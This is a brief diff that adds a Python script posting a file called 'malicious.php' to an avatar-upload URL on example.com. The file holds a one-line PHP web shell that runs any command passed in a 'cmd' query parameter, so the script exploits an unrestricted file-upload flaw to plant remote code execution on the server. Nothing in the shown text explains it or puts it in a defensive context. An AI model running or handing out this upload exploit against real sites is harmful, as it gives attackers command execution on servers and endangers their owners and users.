@@ -1,0 +1,9 @@
+```python
+import requests
+
+url = 'http://example.com/upload_avatar'
+files = {'file': ('malicious.php', '<?php system($_GET["cmd"]); ?>')}
+response = requests.post(url, files=files)
+
+print(response.text)
+```
